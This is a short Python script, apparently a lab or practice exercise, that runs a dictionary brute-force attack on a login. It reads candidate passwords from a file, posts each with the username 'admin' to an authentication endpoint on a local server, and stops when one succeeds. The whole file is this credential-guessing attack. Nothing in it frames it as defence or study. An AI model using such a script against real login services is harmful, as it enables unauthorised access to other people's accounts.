import requests

with open('pop_pas.txt') as f:
    content = f.read()

passwords = content.split("\n")

for password in passwords:
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'admin', 'password': password})
    # print(password)
    if response.status_code == 200:
        print('SUCCESS', password)
        break
